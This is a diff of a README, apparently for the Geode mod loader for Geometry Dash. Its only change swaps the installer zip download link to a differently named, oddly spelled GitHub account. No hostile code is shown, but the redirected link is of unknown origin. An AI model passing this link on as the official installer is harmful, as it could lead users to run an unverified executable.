@@ -6,7 +6,7 @@
 <img width="124" height="124" alt="images1" src="https://github.com/user-attachments/assets/71ad0d21-1052-460f-8150-13a1a1069a47" />
 
 ## Install
-[Download `Geode-Installer.zip`](https://github.com/geode-gd-hub/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Installer.zip)
+[Download `Geode-Installer.zip`](https://github.com/geode-geomatydash/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Installer.zip)
 ---
 <img width="738" height="416" alt="images2" src="https://github.com/user-attachments/assets/f1bed0b2-265a-4597-a09f-b7a5afcad412" />
 
